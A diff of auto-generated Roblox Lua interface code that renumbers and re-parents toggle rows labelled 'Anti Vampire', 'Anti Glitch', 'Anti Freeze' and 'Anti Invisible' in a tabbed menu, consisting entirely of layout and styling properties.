-G2L["1af"] = Instance.new("TextLabel", G2L["1a8"]);
-G2L["1af"]["TextWrapped"] = true;
-G2L["1af"]["BorderSizePixel"] = 0;
-G2L["1af"]["TextSize"] = 14;
-G2L["1af"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1af"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1af"]["BackgroundTransparency"] = 1;
-G2L["1af"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1af"]["Text"] = [[Anti Vampire]];
-G2L["1af"]["Name"] = [[text]];
-G2L["1af"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["1dd"] = Instance.new("TextLabel", G2L["1d6"]);
+G2L["1dd"]["TextWrapped"] = true;
+G2L["1dd"]["BorderSizePixel"] = 0;
+G2L["1dd"]["TextSize"] = 14;
+G2L["1dd"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1dd"]["BackgroundTransparency"] = 1;
+G2L["1dd"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["1dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1dd"]["Text"] = [[Anti Vampire]];
+G2L["1dd"]["Name"] = [[text]];
+G2L["1dd"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.UIPadding
-G2L["1b0"] = Instance.new("UIPadding", G2L["1af"]);
-G2L["1b0"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["1de"] = Instance.new("UIPadding", G2L["1dd"]);
+G2L["1de"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.text
-G2L["1b1"] = Instance.new("UIStroke", G2L["1af"]);
-G2L["1b1"]["Name"] = [[text]];
+G2L["1df"] = Instance.new("UIStroke", G2L["1dd"]);
+G2L["1df"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.UIPadding
-G2L["1b2"] = Instance.new("UIPadding", G2L["1a8"]);
-G2L["1b2"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["1e0"] = Instance.new("UIPadding", G2L["1d6"]);
+G2L["1e0"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch
-G2L["1b3"] = Instance.new("Frame", G2L["17e"]);
-G2L["1b3"]["BorderSizePixel"] = 0;
-G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1b3"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1b3"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b3"]["Name"] = [[glitch]];
-G2L["1b3"]["LayoutOrder"] = 2;
-G2L["1b3"]["BackgroundTransparency"] = 1;
+G2L["1e1"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1e1"]["BorderSizePixel"] = 0;
+G2L["1e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e1"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1e1"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e1"]["Name"] = [[glitch]];
+G2L["1e1"]["LayoutOrder"] = 2;
+G2L["1e1"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button
-G2L["1b4"] = Instance.new("TextButton", G2L["1b3"]);
-G2L["1b4"]["BorderSizePixel"] = 0;
-G2L["1b4"]["TextTransparency"] = 1;
-G2L["1b4"]["TextSize"] = 14;
-G2L["1b4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1b4"]["BackgroundTransparency"] = 1;
-G2L["1b4"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b4"]["Name"] = [[button]];
+G2L["1e2"] = Instance.new("TextButton", G2L["1e1"]);
+G2L["1e2"]["BorderSizePixel"] = 0;
+G2L["1e2"]["TextTransparency"] = 1;
+G2L["1e2"]["TextSize"] = 14;
+G2L["1e2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e2"]["BackgroundTransparency"] = 1;
+G2L["1e2"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e2"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.UIPadding
-G2L["1b5"] = Instance.new("UIPadding", G2L["1b4"]);
-G2L["1b5"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1b5"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1b5"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1b5"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1e3"] = Instance.new("UIPadding", G2L["1e2"]);
+G2L["1e3"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1e3"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1e3"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1e3"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame
-G2L["1b6"] = Instance.new("Frame", G2L["1b4"]);
-G2L["1b6"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1b6"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1b6"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1b6"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1b6"]["Name"] = [[toggleFrame]];
+G2L["1e4"] = Instance.new("Frame", G2L["1e2"]);
+G2L["1e4"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1e4"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1e4"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1e4"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1e4"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.outlineStroke
-G2L["1b7"] = Instance.new("UIStroke", G2L["1b6"]);
-G2L["1b7"]["Thickness"] = 2;
-G2L["1b7"]["Name"] = [[outlineStroke]];
+G2L["1e5"] = Instance.new("UIStroke", G2L["1e4"]);
+G2L["1e5"]["Thickness"] = 2;
+G2L["1e5"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade
-G2L["1b8"] = Instance.new("CanvasGroup", G2L["1b6"]);
-G2L["1b8"]["BorderSizePixel"] = 0;
-G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1b8"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b8"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b8"]["Name"] = [[toggleFade]];
+G2L["1e6"] = Instance.new("CanvasGroup", G2L["1e4"]);
+G2L["1e6"]["BorderSizePixel"] = 0;
+G2L["1e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e6"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e6"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade.UIGradient
-G2L["1b9"] = Instance.new("UIGradient", G2L["1b8"]);
-G2L["1b9"]["Rotation"] = 90;
-G2L["1b9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1e7"] = Instance.new("UIGradient", G2L["1e6"]);
+G2L["1e7"]["Rotation"] = 90;
+G2L["1e7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text
-G2L["1ba"] = Instance.new("TextLabel", G2L["1b3"]);
-G2L["1ba"]["TextWrapped"] = true;
-G2L["1ba"]["BorderSizePixel"] = 0;
-G2L["1ba"]["TextSize"] = 14;
-G2L["1ba"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ba"]["BackgroundTransparency"] = 1;
-G2L["1ba"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ba"]["Text"] = [[Anti Glitch]];
-G2L["1ba"]["Name"] = [[text]];
-G2L["1ba"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["1e8"] = Instance.new("TextLabel", G2L["1e1"]);
+G2L["1e8"]["TextWrapped"] = true;
+G2L["1e8"]["BorderSizePixel"] = 0;
+G2L["1e8"]["TextSize"] = 14;
+G2L["1e8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e8"]["BackgroundTransparency"] = 1;
+G2L["1e8"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["1e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e8"]["Text"] = [[Anti Glitch]];
+G2L["1e8"]["Name"] = [[text]];
+G2L["1e8"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.UIPadding
-G2L["1bb"] = Instance.new("UIPadding", G2L["1ba"]);
-G2L["1bb"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["1e9"] = Instance.new("UIPadding", G2L["1e8"]);
+G2L["1e9"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.text
-G2L["1bc"] = Instance.new("UIStroke", G2L["1ba"]);
-G2L["1bc"]["Name"] = [[text]];
+G2L["1ea"] = Instance.new("UIStroke", G2L["1e8"]);
+G2L["1ea"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.UIPadding
-G2L["1bd"] = Instance.new("UIPadding", G2L["1b3"]);
-G2L["1bd"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["1eb"] = Instance.new("UIPadding", G2L["1e1"]);
+G2L["1eb"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze
-G2L["1be"] = Instance.new("Frame", G2L["17e"]);
-G2L["1be"]["BorderSizePixel"] = 0;
-G2L["1be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1be"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1be"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1be"]["Name"] = [[freeze]];
-G2L["1be"]["LayoutOrder"] = 5;
-G2L["1be"]["BackgroundTransparency"] = 1;
+G2L["1ec"] = Instance.new("Frame", G2L["1ac"]);
+G2L["1ec"]["BorderSizePixel"] = 0;
+G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ec"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1ec"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["1ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ec"]["Name"] = [[freeze]];
+G2L["1ec"]["LayoutOrder"] = 5;
+G2L["1ec"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button
-G2L["1bf"] = Instance.new("TextButton", G2L["1be"]);
-G2L["1bf"]["BorderSizePixel"] = 0;
-G2L["1bf"]["TextTransparency"] = 1;
-G2L["1bf"]["TextSize"] = 14;
-G2L["1bf"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1bf"]["BackgroundTransparency"] = 1;
-G2L["1bf"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1bf"]["Name"] = [[button]];
+G2L["1ed"] = Instance.new("TextButton", G2L["1ec"]);
+G2L["1ed"]["BorderSizePixel"] = 0;
+G2L["1ed"]["TextTransparency"] = 1;
+G2L["1ed"]["TextSize"] = 14;
+G2L["1ed"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ed"]["BackgroundTransparency"] = 1;
+G2L["1ed"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ed"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.UIPadding
-G2L["1c0"] = Instance.new("UIPadding", G2L["1bf"]);
-G2L["1c0"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1c0"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1c0"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1c0"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["1ee"] = Instance.new("UIPadding", G2L["1ed"]);
+G2L["1ee"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1ee"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1ee"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1ee"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame
-G2L["1c1"] = Instance.new("Frame", G2L["1bf"]);
-G2L["1c1"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1c1"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1c1"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1c1"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1c1"]["Name"] = [[toggleFrame]];
+G2L["1ef"] = Instance.new("Frame", G2L["1ed"]);
+G2L["1ef"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1ef"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1ef"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1ef"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1ef"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.outlineStroke
-G2L["1c2"] = Instance.new("UIStroke", G2L["1c1"]);
-G2L["1c2"]["Thickness"] = 2;
-G2L["1c2"]["Name"] = [[outlineStroke]];
+G2L["1f0"] = Instance.new("UIStroke", G2L["1ef"]);
+G2L["1f0"]["Thickness"] = 2;
+G2L["1f0"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade
-G2L["1c3"] = Instance.new("CanvasGroup", G2L["1c1"]);
-G2L["1c3"]["BorderSizePixel"] = 0;
-G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1c3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1c3"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1c3"]["Name"] = [[toggleFade]];
+G2L["1f1"] = Instance.new("CanvasGroup", G2L["1ef"]);
+G2L["1f1"]["BorderSizePixel"] = 0;
+G2L["1f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f1"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f1"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f1"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade.UIGradient
-G2L["1c4"] = Instance.new("UIGradient", G2L["1c3"]);
-G2L["1c4"]["Rotation"] = 90;
-G2L["1c4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["1f2"] = Instance.new("UIGradient", G2L["1f1"]);
+G2L["1f2"]["Rotation"] = 90;
+G2L["1f2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text
-G2L["1c5"] = Instance.new("TextLabel", G2L["1be"]);
-G2L["1c5"]["TextWrapped"] = true;
-G2L["1c5"]["BorderSizePixel"] = 0;
-G2L["1c5"]["TextSize"] = 14;
-G2L["1c5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1c5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1c5"]["BackgroundTransparency"] = 1;
-G2L["1c5"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1c5"]["Text"] = [[Anti Freeze]];
-G2L["1c5"]["Name"] = [[text]];
-G2L["1c5"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.UIPadding
-G2L["1c6"] = Instance.new("UIPadding", G2L["1c5"]);
-G2L["1c6"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.text
-G2L["1c7"] = Instance.new("UIStroke", G2L["1c5"]);
-G2L["1c7"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.UIPadding
-G2L["1c8"] = Instance.new("UIPadding", G2L["1be"]);
-G2L["1c8"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible
-G2L["1c9"] = Instance.new("Frame", G2L["17e"]);
-G2L["1c9"]["BorderSizePixel"] = 0;
-G2L["1c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1c9"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1c9"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1c9"]["Name"] = [[invisible]];
-G2L["1c9"]["LayoutOrder"] = 5;
-G2L["1c9"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button
-G2L["1ca"] = Instance.new("TextButton", G2L["1c9"]);
-G2L["1ca"]["BorderSizePixel"] = 0;
-G2L["1ca"]["TextTransparency"] = 1;
-G2L["1ca"]["TextSize"] = 14;
-G2L["1ca"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1ca"]["BackgroundTransparency"] = 1;
-G2L["1ca"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ca"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.UIPadding
-G2L["1cb"] = Instance.new("UIPadding", G2L["1ca"]);
-G2L["1cb"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1cb"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1cb"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1cb"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame
-G2L["1cc"] = Instance.new("Frame", G2L["1ca"]);
-G2L["1cc"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1cc"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1cc"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1cc"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1cc"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.outlineStroke
-G2L["1cd"] = Instance.new("UIStroke", G2L["1cc"]);
-G2L["1cd"]["Thickness"] = 2;
-G2L["1cd"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade
-G2L["1ce"] = Instance.new("CanvasGroup", G2L["1cc"]);
-G2L["1ce"]["BorderSizePixel"] = 0;
-G2L["1ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ce"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ce"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ce"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade.UIGradient
-G2L["1cf"] = Instance.new("UIGradient", G2L["1ce"]);
-G2L["1cf"]["Rotation"] = 90;
-G2L["1cf"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text
-G2L["1d0"] = Instance.new("TextLabel", G2L["1c9"]);
-G2L["1d0"]["TextWrapped"] = true;
-G2L["1d0"]["BorderSizePixel"] = 0;
-G2L["1d0"]["TextSize"] = 14;
-G2L["1d0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1d0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d0"]["BackgroundTransparency"] = 1;
-G2L["1d0"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d0"]["Text"] = [[Anti Invisible]];
-G2L["1d0"]["Name"] = [[text]];
-G2L["1d0"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.UIPadding
-G2L["1d1"] = Instance.new("UIPadding", G2L["1d0"]);
-G2L["1d1"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.text
-G2L["1d2"] = Instance.new("UIStroke", G2L["1d0"]);
-G2L["1d2"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.UIPadding
-G2L["1d3"] = Instance.new("UIPadding", G2L["1c9"]);
-G2L["1d3"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph
-G2L["1d4"] = Instance.new("Frame", G2L["17e"]);
-G2L["1d4"]["BorderSizePixel"] = 0;
-G2L["1d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d4"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1d4"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d4"]["Name"] = [[morph]];
-G2L["1d4"]["LayoutOrder"] = 5;
-G2L["1d4"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button
-G2L["1d5"] = Instance.new("TextButton", G2L["1d4"]);
-G2L["1d5"]["BorderSizePixel"] = 0;
-G2L["1d5"]["TextTransparency"] = 1;
-G2L["1d5"]["TextSize"] = 14;
-G2L["1d5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1d5"]["BackgroundTransparency"] = 1;
-G2L["1d5"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d5"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.UIPadding
-G2L["1d6"] = Instance.new("UIPadding", G2L["1d5"]);
-G2L["1d6"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1d6"]["PaddingRight"] = UDim.new(0, 3);
